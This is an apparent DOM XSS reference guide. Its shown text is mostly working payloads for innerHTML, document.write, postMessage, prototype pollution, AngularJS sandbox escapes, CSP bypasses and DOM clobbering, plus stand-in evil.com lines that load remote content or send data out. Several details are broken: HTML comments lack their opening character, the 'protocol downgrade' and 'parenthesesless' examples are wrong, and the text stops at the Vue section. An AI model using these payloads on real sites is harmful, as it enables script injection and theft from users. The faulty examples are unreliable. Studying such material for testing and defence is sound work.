# DOM-Based Cross-Site Scripting (DOM XSS) — Complete Research Knowledgebase

> **Version:** Research Grade | **Last Updated:** 2026-05-23  
> **Sources:** PortSwigger Research, MDN Web Docs, HackTricks, PayloadsAllTheThings, ProjectDiscovery, BlackFan (Prototype Pollution), Fransr (postMessage Tracker), and numerous bug bounty research publications.

---

## Table of Contents

- [Basics](#basics)
- [DOM XSS Theory](#dom-xss-theory)
- [Sources and Sinks](#sources-and-sinks)
- [innerHTML Abuse](#innerhtml-abuse)
- [document.write Abuse](#documentwrite-abuse)
- [location.hash Abuse](#locationhash-abuse)
- [URLSearchParams Abuse](#urlsearchparams-abuse)
- [postMessage Chains](#postmessage-chains)
- [localStorage/sessionStorage Abuse](#localstoragesessionstorage-abuse)
- [Prototype Pollution + DOM XSS Chains](#prototype-pollution--dom-xss-chains)
- [AngularJS Sandbox Escapes](#angularjs-sandbox-escapes)
- [CSP Bypass Chains](#csp-bypass-chains)
- [DOM Clobbering Chains](#dom-clobbering-chains)
- [Client-Side Redirect Chains](#client-side-redirect-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Framework-Specific DOM XSS](#framework-specific-dom-xss)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is DOM XSS?

DOM-based XSS (also known as **client-side XSS**) occurs when an application contains some client-side JavaScript that processes data from an **untrusted source** in an **unsafe way**, usually by writing the data back to the DOM.

Unlike reflected or stored XSS, DOM XSS does not involve the server receiving malicious payload in an HTTP request/response cycle. The vulnerability exists entirely within client-side code.

### The Source → Sink Model

DOM XSS can be understood through two fundamental concepts:

- **Source:** The JavaScript property that accepts data potentially controlled by an attacker.
- **Sink:** A potentially dangerous JavaScript function or DOM API that can cause undesirable effects if attacker-controlled data is passed to it.

> **Key Insight:** The most common source for DOM XSS is the **URL**, typically accessed via `location` object. When an attacker can construct a malicious URL that causes JavaScript to execute, they can exploit the vulnerability without any server interaction.

### Why DOM XSS is Dangerous

1. **Invisible to Server Logs:** Traditional WAFs and server-side filters often miss DOM XSS because the payload never reaches the server.
2. **Single-Page Applications (SPAs):** Modern frameworks heavily rely on client-side routing and DOM manipulation, increasing the attack surface.
3. **Post-Exploitation:** DOM XSS can be chained with other vulnerabilities (prototype pollution, postMessage misconfigurations, DOM clobbering) to achieve critical impact.
4. **CSP Bypass Potential:** Since execution happens via existing inline scripts or injected markup, DOM XSS can bypass strict CSPs when combined with gadget chains.

---

## DOM XSS Theory

### How DOM XSS Arises

DOM XSS arises when JavaScript takes attacker-controllable data (source) and passes it to a function (sink) that supports dynamic code execution or HTML rendering. The classic pattern:

```javascript
// Attacker controls 'name' parameter
var name = new URLSearchParams(window.location.search).get('name');
// Unsafe sink
 document.write('<h1>Hello ' + name + '</h1>');
```

### Taint Analysis Perspective

From a taint-tracking perspective, DOM XSS is a **taint sink violation**:
- Data flows from an attacker-controlled **source** (tainted)
- Through potentially sanitization/transform functions
- Into an execution **sink** without proper neutralization

### Types of DOM XSS

| Type | Description | Example |
|------|-------------|---------|
| **Reflected DOM XSS** | Source is in request/URL, processed immediately | `location.search` → `innerHTML` |
| **Stored DOM XSS** | Source is in storage (WebSQL, IndexedDB, localStorage) | `localStorage.getItem()` → `eval()` |
| **Universal DOM XSS** | Vulnerability in browser/extension/JavaScript library | jQuery `$(location.hash)` |
| **PostMessage DOM XSS** | Source is `message` event from another origin | `window.addEventListener('message')` → `document.write` |

### The Role of JavaScript Frameworks

Modern frameworks introduce additional complexity:
- **Template engines** (AngularJS, Vue, React) may evaluate expressions
- **Client-side routing** parses hash fragments
- **State management** may deserialize untrusted data
- **Shadow DOM** may create isolated but still vulnerable sinks

---

## Sources and Sinks

### Common Sources (Attacker-Controlled Inputs)

Sources are JavaScript properties that accept data potentially controlled by an attacker. The most common sources are:

#### URL-Based Sources

| Source | Description | Example Value |
|--------|-------------|---------------|
| `document.URL` | Full URL of the page | `https://example.com/page?x=1#y=2` |
| `document.documentURI` | Alias for document.URL | Same as above |
| `document.baseURI` | Base URL for resolving relative URLs | `https://example.com/path/` |
| `location.href` | Full URL | `https://example.com/page?x=1` |
| `location.search` | Query string (with `?`) | `?x=1&y=2` |
| `location.hash` | Fragment identifier (with `#`) | `#section` |
| `location.pathname` | Path portion | `/path/to/page` |
| `location.hostname` | Domain | `example.com` |

#### Web Storage Sources

| Source | Description |
|--------|-------------|
| `localStorage` | Persistent storage per origin |
| `sessionStorage` | Session-scoped storage per origin |
| `IndexedDB` | Structured client-side database |
| `WebSQL` | Deprecated but still present in some apps |

#### Message/Communication Sources

| Source | Description |
|--------|-------------|
| `postMessage` data | Cross-origin message passing |
| `WebSocket` messages | Bidirectional communication |
| `EventSource` (SSE) | Server-sent events |

#### Other Sources

| Source | Description |
|--------|-------------|
| `document.cookie` | HTTP cookies accessible to JavaScript |
| `document.referrer` | Referring URL |
| `window.name` | Persistent across navigations |
| `history.pushState` / `replaceState` | History API state objects |
| `URLSearchParams` | Parsed query parameters |
| `FileReader` result | User-selected file contents |
| `BroadcastChannel` | Cross-tab communication |

### Common Sinks (Dangerous Destinations)

Sinks are JavaScript functions and DOM APIs that can cause undesirable effects if attacker-controlled data is passed to them.

#### HTML Rendering Sinks

| Sink | Risk | Notes |
|------|------|-------|
| `document.write()` | Direct HTML injection | Can overwrite entire document |
| `element.innerHTML` | HTML injection | Does NOT execute `<script>` tags in modern browsers but executes other vectors |
| `element.outerHTML` | HTML injection | Replaces element and parses HTML |
| `element.insertAdjacentHTML` | HTML injection | Position parameter controls insertion point |
| `element.html` (jQuery) | HTML injection | jQuery-specific wrapper |
| `document.writeln()` | HTML injection | Similar to `document.write()` |
| `DOMParser.parseFromString()` | Parser-based execution | If result is inserted into DOM |
| `Range.createContextualFragment()` | HTML fragment injection | Creates document fragment from string |

#### JavaScript Execution Sinks

| Sink | Risk | Notes |
|------|------|-------|
| `eval()` | Direct code execution | Executes string as JS |
| `setTimeout(string)` | Delayed code execution | String argument is evaluated |
| `setInterval(string)` | Repeated code execution | String argument is evaluated |
| `Function(string)` | Function constructor | Creates function from string |
| `window.execScript()` | IE-specific execution | Deprecated but relevant for legacy |
| `script.textContent` | Script injection | If script is appended to DOM |
| `script.src` | External script loading | Can load attacker-controlled JS |

#### URL/Navigation Sinks

| Sink | Risk | Notes |
|------|------|-------|
| `location.href = ...` | Open redirect / JS execution | `javascript:` and `data:` schemes |
| `location.replace(...)` | Navigation | Same as above |
| `location.assign(...)` | Navigation | Same as above |
| `window.open(...)` | New window/tab | Can execute JS via scheme |
| `element.src` | Resource loading | `<iframe>`, `<script>`, `<img>` |
| `element.href` | Link navigation | `<a>`, `<link>` |
| `element.action` | Form submission | `<form>` |
| `element.formaction` | Button submission | `<button>`, `<input>` |

#### Style/CSS Sinks

| Sink | Risk | Notes |
|------|------|-------|
| `element.style.cssText` | CSS injection | Can lead to expression/behavior execution in old IE |
| `element.setAttribute('style', ...)` | CSS injection | Same risk |
| `element.style` direct property | CSS injection | Specific properties like `background-image: url('javascript:...')` |

#### Template/Binding Sinks

| Sink | Risk | Notes |
|------|------|-------|
| `ng-app` / AngularJS expressions | Template injection | See AngularJS section |
| `Vue` template expressions | Template injection | `{{ }}` interpolation |
| `Mustache` / Handlebars rendering | Template injection | If user input reaches template |
| `eval()` inside template engines | Code execution | Many template engines compile to JS |

### Source-to-Sink Mapping Matrix

```
location.search ──┬──> document.write()          [Direct HTML injection]
                  ├──> element.innerHTML          [HTML injection, no script exec]
                  ├──> eval()                     [Direct JS execution]
                  ├──> setTimeout()               [Delayed JS execution]
                  ├──> location.href = ...        [Open redirect / JS scheme]
                  ├──> script.src                 [External script loading]
                  └──> element.style.cssText      [CSS injection]

postMessage.data ─┬──> document.write()          [Cross-origin DOM XSS]
                  ├──> eval()                     [Cross-origin code execution]
                  └──> innerHTML                  [Cross-origin HTML injection]

localStorage ─────┬──> eval()                     [Stored DOM XSS]
                  ├──> document.write()           [Stored HTML injection]
                  └──> innerHTML                  [Stored HTML injection]
```

---

## innerHTML Abuse

### The innerHTML Risk Model

`innerHTML` is one of the most common DOM XSS sinks. It parses a string as HTML and replaces the contents of an element.

**Critical Behavior:** In modern browsers, `innerHTML` does **NOT** execute `<script>` tags. However, it **DOES** execute other dangerous HTML:

- `<img src=x onerror=alert(1)>`
- `<svg onload=alert(1)>`
- `<iframe src=javascript:alert(1)>`
- `<input onfocus=alert(1) autofocus>`
- `<body onload=alert(1)>`
- `<link rel=import href=//evil.com>` (deprecated but relevant)
- `<meta http-equiv=refresh content="0;url=javascript:alert(1)">`

### innerHTML Payloads

```html
<!-- Basic img onerror -->
<img src=x onerror=alert(1)>

<!-- SVG onload (often bypasses filters looking for img) -->
<svg onload=alert(1)>

<!-- Iframe with javascript scheme -->
<iframe src="javascript:alert(1)">

<!-- Input autofocus -->
<input onfocus=alert(1) autofocus>

!-- Video with onerror -->
<video><source onerror="alert(1)">

!-- Audio with onerror -->
<audio src=x onerror=alert(1)>

!-- Image with invalid source and onerror -->
<img src=//:0 onerror=alert(1)>

!-- MathML with maction (Firefox specific) -->
<math><mtext onmouseover=alert(1)>hover

!-- Details with toggle event -->
<details open ontoggle=alert(1)>

!-- Select with onchange -->
<select onchange=alert(1)><option>1<option>2

!-- Marquee (legacy but still works) -->
<marquee onstart=alert(1)>

!-- Object with data javascript scheme -->
<object data="javascript:alert(1)">

!-- Embed with javascript scheme -->
<embed src="javascript:alert(1)">
```

### innerHTML with Template Literals (Modern JS)

```javascript
// Dangerous pattern in modern frameworks
const userInput = location.hash.slice(1);
element.innerHTML = `<div class="${userInput}">Welcome</div>`;

// Exploitation via style attribute injection
#"><img src=x onerror=alert(1)><div class="
```

### innerHTML Bypass Techniques

```html
<!-- Case variation -->
<IMG SRC=X ONERROR=ALERT(1)>

!-- HTML entities in event handlers -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

!-- Backticks in handlers (if quotes are filtered) -->
<img src=x onerror=alert`1`>

!-- Parenthesesless execution -->
<img src=x onerror=alert;alert(1)>

!-- Using location.replace inside handler -->
<img src=x onerror="location='javascript:alert(1)'">

!-- Using throw with eval -->
<img src=x onerror="throw onerror=alert,1">

!-- Using setTimeout -->
<img src=x onerror="setTimeout('alert(1)',0)">
```

### innerHTML in Shadow DOM

```javascript
// Shadow DOM innerHTML is equally dangerous
const shadow = element.attachShadow({mode: 'open'});
shadow.innerHTML = attackerControlledString;  // XSS
```

---

## document.write Abuse

### The document.write Risk Model

`document.write()` writes a string of text to the document stream opened by `document.open()`. It is extremely dangerous because:

1. It can write to the **active document stream**, potentially overwriting the entire page
2. It executes `<script>` tags immediately
3. It can be called during document parsing (before DOMContentLoaded) to inject into the live document

### document.write Payloads

```html
<!-- Basic script injection -->
<script>alert(1)</script>

!-- Script with HTML entities -->
<script>alert&#40;1&#41;</script>

!-- Splitting with document.write to bypass filters -->
<script>document.write('<script>alert(1)</scr' + 'ipt>')</script>

!-- Using document.writeln -->
<script>document.writeln('<img src=x onerror=alert(1)>')</script>

!-- Closing existing tags and opening script -->
</div><script>alert(1)</script><div>

!-- Injecting after a form -->
</form><script>alert(1)</script><form>
```

### document.write with location.search

```javascript
// Vulnerable code pattern
var search = location.search.substring(1);
document.write('<div>Search results for: ' + decodeURIComponent(search) + '</div>');

// Exploitation
?search=%3Cscript%3Ealert(1)%3C/script%3E
```

### document.write during Page Load

If `document.write()` is called from an inline script during initial HTML parsing, it writes into the **same stream** being parsed by the browser. This allows injection that appears to be part of the original HTML.

```html
<!-- Vulnerable inline script -->
<script>
  var params = new URLSearchParams(location.search);
  document.write('<div>' + params.get('name') + '</div>');
</script>

<!-- Attacker injects: -->
?name=<script>alert(1)</script>
```

### document.write with document.open

```javascript
// Attacker can open a new document stream
document.open();
document.write('<html><body><script>alert(1)</script></body></html>');
document.close();
```

---

## location.hash Abuse

### The Hash-Based DOM XSS Pattern

`location.hash` (or `location.href` containing a fragment) is a classic source for DOM XSS. Many applications use the hash for:
- Client-side routing in SPAs
- Tab/section navigation
- Storing state
- Tracking/analytics

### Direct Hash Injection

```javascript
// Vulnerable pattern: reading hash and writing to DOM
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = decodeURIComponent(hash);

// Exploitation:
https://example.com/page#<img src=x onerror=alert(1)>
```

### Hash Change Event

```javascript
// Vulnerable pattern: jQuery hashchange or native popstate/hashchange
window.addEventListener('hashchange', function() {
    var hash = location.hash.substring(1);
    $('#content').html(hash);  // jQuery innerHTML equivalent
});

// Trigger by navigating to:
https://example.com/page#<script>alert(1)</script>
// Or programmatically:
location.hash = '<img src=x onerror=alert(1)>';
```

### jQuery Selector Hash Change (PortSwigger Lab)

```javascript
// Extremely dangerous jQuery pattern
$(window).on('hashchange', function() {
    var element = $(location.hash);  // jQuery selector from hash!
    element[0].scrollIntoView();
});

// Exploitation via jQuery selector injection:
https://example.com/page#<img src=x onerror=alert(1)>
// jQuery parses the hash as a selector, creates the element, and the event handler fires
```

> **Research Note:** This vulnerability exists because jQuery's `$()` function creates HTML elements when the string looks like HTML markup (starts with `<`). The element is created in memory, the event handler fires, and XSS executes even though the element is never appended to the DOM.

### Hash-Based Client-Side Routing

```javascript
// Angular/React/Vue router parsing
const route = location.hash.slice(1);
// If route is used in template rendering without sanitization
```

### Hash Storage and Retrieval

```javascript
// Storing state in hash
var state = JSON.parse(decodeURIComponent(location.hash.substring(1)));
// If state is rendered unsafely
```

---

## URLSearchParams Abuse

### URLSearchParams as Source

`URLSearchParams` provides a convenient API for parsing query strings, but the values extracted are attacker-controlled.

```javascript
// Vulnerable pattern
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.write(`Hello ${name}`);

// Exploitation:
?name=<script>alert(1)</script>
```

### URLSearchParams with forEach

```javascript
// Iterating over all parameters
const params = new URLSearchParams(location.search);
params.forEach((value, key) => {
    document.getElementById(key).innerHTML = value;  // Extremely dangerous
});

// Exploitation:
?div1=<img src=x onerror=alert(1)>
```

### URLSearchParams with URL Manipulation

```javascript
// Constructing URLs from parameters
const params = new URLSearchParams(location.search);
const redirect = params.get('redirect');
location.href = redirect;  // Open redirect + potential JS execution

// Exploitation:
?redirect=javascript:alert(1)
```

---

## postMessage Chains

### postMessage Security Model

`window.postMessage()` enables cross-origin communication. The security depends on:
1. **Target Origin:** `targetOrigin` parameter in `postMessage(data, targetOrigin)`
2. **Origin Validation:** `event.origin` check in the receiver

### Vulnerable postMessage Patterns

```javascript
// VULNERABLE: No origin check
window.addEventListener('message', function(event) {
    eval(event.data);  // Direct execution of any message
});

// VULNERABLE: Weak origin check (substring match)
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('trusted.com') !== -1) {
        document.write(event.data);
    }
});

// VULNERABLE: Origin check but unsafe sink
window.addEventListener('message', function(event) {
    if (event.origin === 'https://trusted.com') {
        document.getElementById('content').innerHTML = event.data;
    }
});
```

### postMessage Origin Bypass Techniques

```javascript
// Subdomain takeover / subdomain injection
// If check is: event.origin.includes('example.com')
// Attacker controls: https://evil.example.com

// Null origin bypass
// If receiver checks for null origin specifically
// Attacker can use sandboxed iframe to send null origin
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    window.parent.postMessage('<img src=x onerror=alert(1)>', '*');
  </script>
"></iframe>

// Protocol downgrade bypass
// If check is: event.origin.startsWith('http://trusted.com')
// Attacker uses: https://trusted.com (startsWith matches!)
```

### postMessage Gadget Chains

```javascript
// Gadget: Using postMessage to trigger DOM clobbering
window.addEventListener('message', function(event) {
    if (event.origin === 'https://trusted.com') {
        var config = event.data;
        // If config is used to set properties
        document.getElementById(config.id).innerHTML = config.html;
    }
});

// Attack:
// From https://trusted.com or via origin bypass:
window.postMessage({
    id: 'content',
    html: '<img src=x onerror=alert(1)>'
}, '*');
```

### postMessage + JSON.parse Gadgets

```javascript
// If message data is expected to be JSON but not validated
window.addEventListener('message', function(event) {
    var data = JSON.parse(event.data);
    document.getElementById(data.target).innerHTML = data.content;
});

// Attack:
window.postMessage('{"target":"content","content":"<img src=x onerror=alert(1)>"}', '*');
```

### postMessage Tracker Usage

Use [postMessage-tracker](https://github.com/fransr/postMessage-tracker) to monitor and fuzz postMessage handlers:

```javascript
// Bookmarklet / DevTools snippet to hook postMessage
(function() {
    var original = window.postMessage;
    window.postMessage = function(msg, origin) {
        console.log('postMessage called:', msg, 'to', origin);
        original.apply(this, arguments);
    };
})();
```

---

## localStorage/sessionStorage Abuse

### Storage-Based XSS (Stored DOM XSS)

Web Storage APIs (`localStorage` and `sessionStorage`) can serve as **stored** sources for DOM XSS. If attacker-controlled data is written to storage and later retrieved into a sink, the vulnerability is effectively a stored DOM XSS.

### Vulnerable Patterns

```javascript
// Pattern 1: Direct storage to sink
var data = localStorage.getItem('userInput');
document.write(data);

// Pattern 2: Storage populated from URL parameter
localStorage.setItem('userInput', location.search);
// ... later ...
var stored = localStorage.getItem('userInput');
eval(stored);

// Pattern 3: JSON deserialization from storage
var config = JSON.parse(localStorage.getItem('appConfig'));
document.getElementById('app').innerHTML = config.template;
```

### Cross-Tab DOM XSS via Storage Events

```javascript
// The storage event fires in all tabs from the same origin
window.addEventListener('storage', function(event) {
    // event.key, event.oldValue, event.newValue
    document.getElementById('content').innerHTML = event.newValue;
});

// Attacker opens another tab on same origin and sets:
localStorage.setItem('x', '<img src=x onerror=alert(1)>');
```

### localStorage + Prototype Pollution Chain

```javascript
// If application merges storage objects with defaults
var defaults = { theme: 'light', lang: 'en' };
var userPrefs = JSON.parse(localStorage.getItem('prefs'));
var config = Object.assign(defaults, userPrefs);  // Pollution if userPrefs has __proto__
```

---

## Prototype Pollution + DOM XSS Chains

### Understanding Prototype Pollution

Prototype pollution allows an attacker to modify the behavior of JavaScript objects by polluting `Object.prototype` with unexpected properties. When combined with DOM XSS, it creates powerful gadget chains.

### The `__proto__` / `constructor.prototype` Vector

```javascript
// Classic prototype pollution via JSON merge
var malicious = JSON.parse('{"__proto__":{"isAdmin":true}}');
var config = Object.assign({}, malicious);
// Now all objects have isAdmin=true
```

### Prototype Pollution to DOM XSS Gadgets

```javascript
// Gadget 1: Polluting innerHTML property
// If library checks: if (element.innerHTML) { element.innerHTML = value }
// Pollution: Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'

// Gadget 2: jQuery attribute pollution
// jQuery's attr() method falls back to prototype properties
// Object.prototype.src = 'x';
// Object.prototype.onerror = 'alert(1)';
// $('img').attr({}) triggers the polluted attributes

// Gadget 3: Template engine pollution
// If template engine does: var value = obj.property || defaultValue
// Pollution can override defaults leading to XSS
```

### Client-Side Prototype Pollution Sources

| Source | Vector | Example |
|--------|--------|---------|
| URL parameters | `?__proto__[x]=y` | `?__proto__[innerHTML]=<img src=x onerror=alert(1)>` |
| URL hash | `#__proto__[x]=y` | Same as above |
| postMessage | `{"__proto__":{...}}` | Cross-origin pollution |
| localStorage | Stored polluted JSON | Persistent across sessions |
| JSON.parse | Direct parsing | `JSON.parse('{"__proto__":{}}')` |
| Form inputs | Name attributes | `<input name="__proto__[x]" value="y">` |

### URL-Based Prototype Pollution Payloads

```
?__proto__[isAdmin]=true
?__proto__[innerHTML]=<img/src=x onerror=alert(1)>
?__proto__[src]=x&__proto__[onerror]=alert(1)
?constructor[prototype][isAdmin]=true
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor.prototype.polluted=true
```

### BlackFan's Client-Side Prototype Pollution Research

Key findings from [client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution):

1. **jQuery:** `$.extend(true, {}, JSON.parse('{"__proto__": {"x": 1}}'))` pollutes prototype
2. **Lodash:** `_.merge({}, JSON.parse('{"__proto__": {"x": 1}}'))` pollutes prototype
3. **YUI:** `Y.merge()` vulnerable
4. **Recursive merge functions** are generally vulnerable if they don't check for `__proto__`

### pp-finder Usage

```bash
# Find prototype pollution gadgets in a target
npx pp-finder --url https://target.com

# Or via CLI
pp-finder -u https://target.com -p "__proto__[x]=1"
```

### pp-debugger Usage

Use [pp-debugger](https://github.com/GoogleChromeLabs/pp-debugger) Chrome extension to:
1. Monitor `Object.prototype` modifications
2. Detect pollution in real-time
3. Trace pollution sources

---

## AngularJS Sandbox Escapes

### AngularJS Expression Injection

AngularJS (1.x) uses `{{ }}` for template expressions. If attacker-controlled data is inserted into an AngularJS template context, expressions are evaluated.

```html
<!-- If user input reaches an AngularJS template -->
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

<!-- Or with ng-bind -->
<div ng-bind="userInput"></div>
<!-- If userInput is: {{constructor.constructor('alert(1)')()}} -->
```

### AngularJS Sandbox Escape History

The AngularJS expression sandbox was designed to prevent access to `Function`, `window`, `document`, etc. However, multiple bypasses were discovered:

#### Sandbox Bypass Payloads (Historical)

```javascript
// 1.0.x - 1.1.x
{{constructor.constructor('alert(1)')()}}

// 1.2.x - 1.2.18
{{a=toString().constructor.prototype;a.charAt=[].join;$eval('a=alert(1)');}}

// 1.2.19 - 1.2.23
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a"]["constructor"]["constructor"]("alert(1)")();}}

// 1.2.24 - 1.2.29
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)');}}

// 1.3.x - 1.3.18
{{a=toString().constructor.prototype;a.charAt=[].join;$eval('a=alert(1)');}}

// 1.3.19 - 1.3.20
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)');}}

// 1.4.x - 1.4.9
{{a=toString().constructor.prototype;a.charAt=[].join;$eval('a=alert(1)');}}

// 1.4.10 - 1.5.x
{{x={toString:[].join,length:1,0:'__proto__'};a=x.charAt=[].join;$eval('x=alert(1)');}}

// 1.6.x - 1.6.9 (no sandbox, direct execution)
{{constructor.constructor('alert(1)')()}}

// 1.6.10+ (sandbox removed entirely)
{{constructor.constructor('alert(1)')()}}
```

### Modern AngularJS Payloads

Since AngularJS 1.6+ removed the sandbox, expression injection is straightforward:

```javascript
// Direct constructor access
{{constructor.constructor('alert(1)')()}}

// Using $eval (if scope is accessible)
{{$eval.constructor('alert(1)')()}}

// Using angular.element
{{angular.element(document).injector().get('$compile')('<script>alert(1)</script>')(angular.element(document).scope())}}

// Using $window
{{$window.alert(1)}}
```

### AngularJS CSP Bypass

With `ng-csp` directive or CSP enabled, certain restrictions apply, but execution is still possible:

```javascript
// CSP-compatible payload (no eval)
{{constructor.constructor('return alert(1)')()}}

// Using $parse service
{{[].constructor.prototype.toString.call.call({}[].constructor.constructor,'alert(1)')()}}
```

### PortSwigger AngularJS Research

Key findings from PortSwigger's research on AngularJS sandbox escapes:
1. The sandbox was never a security boundary—Angular team explicitly stated this
2. Each bypass abused JavaScript's dynamic nature and prototype chains
3. The `charAt` array join technique was particularly resilient across versions
4. Modern Angular (2+) uses entirely different architecture (no expression sandbox)

---

## CSP Bypass Chains

### CSP and DOM XSS Interaction

Content Security Policy (CSP) aims to prevent XSS by restricting script execution. However, DOM XSS can bypass or weaken CSP in several scenarios:

1. **Unsafe Inline Scripts:** If `script-src 'unsafe-inline'` is present, DOM XSS via `<script>` tags works
2. **Nonce-based CSP:** If nonce is leaked or predictable, attacker can use it
3. **Strict-dynamic:** If a trusted script uses `eval()` or `document.write()`, DOM XSS propagates
4. **JSONP / Callback endpoints:** Allowed in `script-src` can be abused

### CSP Policy Injection (PortSwigger Research)

If an application reflects URL parameters into CSP headers without proper sanitization:

```
Content-Security-Policy: script-src 'self' https://trusted.com https://evil.com
```

Attacker can inject their own domain into the policy.

### Nonce-Based CSP Bypasses

```javascript
// If nonce is generated per-request but reflected in DOM
var nonce = document.querySelector('script[nonce]').nonce;
// Attacker can read nonce and construct:
<script nonce="LEAKED_NONCE">alert(1)</script>
```

### DOM XSS + CSP Bypass Techniques

```html
<!-- If script-src 'self' but object-src is missing -->
<object data="https://evil.com/payload.html"></object>

!-- If base-uri is missing -->
<base href="https://evil.com/">

!-- If form-action is missing -->
<form action="https://evil.com/"><button>Click</button></form>

!-- Using javascript: scheme in allowed contexts -->
<a href="javascript:alert(1)">click</a>

!-- Using meta refresh -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### CSP Bypass via AngularJS / Framework Gadgets

If AngularJS is allowed by CSP (e.g., `script-src 'self'` includes AngularJS library):

```html
<!-- ng-app on any element with CSP -->
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
```

### CSP Bypass via JSONP Endpoints

If `script-src` includes a domain with JSONP endpoints:

```html
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>
```

### CSP Bypass via Prototype Pollution

Pollute `script.src` or `script.nonce` via prototype pollution to inject scripts that bypass CSP checks.

---

## DOM Clobbering Chains

### What is DOM Clobbering?

DOM Clobbering is a technique where HTML elements inject named properties into the global scope or object properties, potentially overwriting JavaScript variables and interfering with application logic.

### Basic DOM Clobbering

```html
<!-- If JavaScript expects a variable but HTML defines it -->
<script>
  // Expecting config to be an object
  console.log(config.debug);  // TypeError if config is undefined
</script>
<!-- But attacker injects: -->
<form id="config"><input name="debug" value="true"></form>
<!-- Now window.config is the HTMLFormElement -->
```

### DOM Clobbering to XSS

```html
<!-- If code does: -->
<script>
  var script = document.createElement('script');
  script.src = config.scriptSrc || '/default.js';
  document.body.appendChild(script);
</script>

<!-- Attacker clobbers config with an anchor: -->
<a id="config" href="javascript:alert(1)"></a>
<!-- script.src becomes "javascript:alert(1)" -->
```

### DOM Clobbering with HTMLCollection

```html
<!-- Multiple elements with same ID create HTMLCollection -->
<a id="x">first</a>
<a id="x" href="javascript:alert(1)">second</a>
<script>
  // x becomes HTMLCollection
  // x[0] is first anchor, x[1] is second
  x[1].click();  // Executes javascript:alert(1)
</script>
```

### DOM Clobbering + Prototype Pollution Combo

```javascript
// Step 1: Pollute prototype to create vulnerability
// ?__proto__[scriptSrc]=javascript:alert(1)

// Step 2: If application checks window.config first
// and config is clobbered by HTML element
// The clobbered element's properties take precedence
```

### Advanced DOM Clobbering (PortSwigger Research)

From PortSwigger's "DOM Clobbering Strikes Back":

1. **Nested clobbering:** Using `<form>` with nested `<input>` to create structured objects
2. **SVG clobbering:** SVG elements can clobber properties in certain contexts
3. **Template clobbering:** `<template>` content can be used to prepare clobbering payloads
4. **Shadow DOM clobbering:** Elements in shadow DOM can clobber host properties

```html
<!-- Nested clobbering example -->
<form id="config">
  <input name="api" value="https://evil.com">
  <input name="debug" value="true">
</form>
<script>
  // config.api is the input element
  // config.debug is the input element
  fetch(config.api.value);  // Sends data to evil.com
</script>
```

---

## Client-Side Redirect Chains

### Redirect Sinks

Client-side redirects can be abused for:
1. **Open Redirect** (phishing, OAuth abuse)
2. **JavaScript execution** via `javascript:` scheme
3. **Data exfiltration** via `data:` URI

### Vulnerable Patterns

```javascript
// Pattern 1: Direct location assignment
var redirect = new URLSearchParams(location.search).get('redirect');
location.href = redirect;

// Pattern 2: Meta refresh injection
var delay = params.get('delay');
var url = params.get('url');
document.write('<meta http-equiv="refresh" content="' + delay + ';url=' + url + '">');

// Pattern 3: History API manipulation
history.pushState(null, '', params.get('path'));
// If path is used in routing and rendered
```

### Redirect Payloads

```
?redirect=javascript:alert(1)
?redirect=data:text/html,<script>alert(1)</script>
?url=https://evil.com
?return_to=//evil.com
?nextPath=/../../evil.com
```

### OAuth + Open Redirect Chains

From PortSwigger's "Hidden OAuth Attack Vectors":

```
https://oauth-provider.com/authorize?client_id=...&redirect_uri=https://victim.com/callback?next=javascript:alert(1)
```

If the OAuth callback redirects client-side based on `next` parameter, XSS is achieved.

---

## Parser Confusion Payloads

### HTML Parser Confusion

Browsers have complex HTML parsers with quirks that can be exploited:

```html
<!-- Parser confusion with style tag -->
<style><img src=x onerror=alert(1)></style>
<!-- Content inside style is sometimes parsed as text, sometimes not -->

!-- Table parser confusion -->
<table><tr><td><img src=x onerror=alert(1)></td></tr></table>

!-- ForeignObject in SVG -->
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>

!-- MathML parser -->
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>

!-- Nested forms (parser ignores inner form) -->
<form><form><input name="x" value="<script>alert(1)</script>"></form></form>
```

### Template Literal / String Confusion

```javascript
// If application uses template literals with user input
const html = `<div class="${userInput}">content</div>`;
// Injection: "><img src=x onerror=alert(1)><div class="

// If application uses String.raw
const raw = String.raw`<div>${userInput}</div>`;
```

### JSON Parser Confusion

```javascript
// If application expects JSON but receives HTML
const data = JSON.parse(userInput);
// But if parser is confused by leading whitespace or BOM
﻿{"__proto__":{"x":1}}
```

---

## Framework-Specific DOM XSS

### React

React uses JSX and automatically escapes content rendered with `{}`. However, vulnerabilities exist:

```jsx
// DANGEROUS: dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// DANGEROUS: href with user input
<a href={userInput}>link</a>
// Payload: javascript:alert(1)

// DANGEROUS: Forming URLs
<img src={userInput} />
// Payload: //evil.com (protocol-relative)

// DANGEROUS: Attribute spread
<div {...userControlledObject} />
// If object contains onClick, onError, etc.

// DANGEROUS: useRef + innerHTML
const ref = useRef();
useEffect(() => {
  ref.current.innerHTML = userInput;
}, []);
```

### Vue.js

```html
<!-- Safe: {{ }} escapes HTML -->
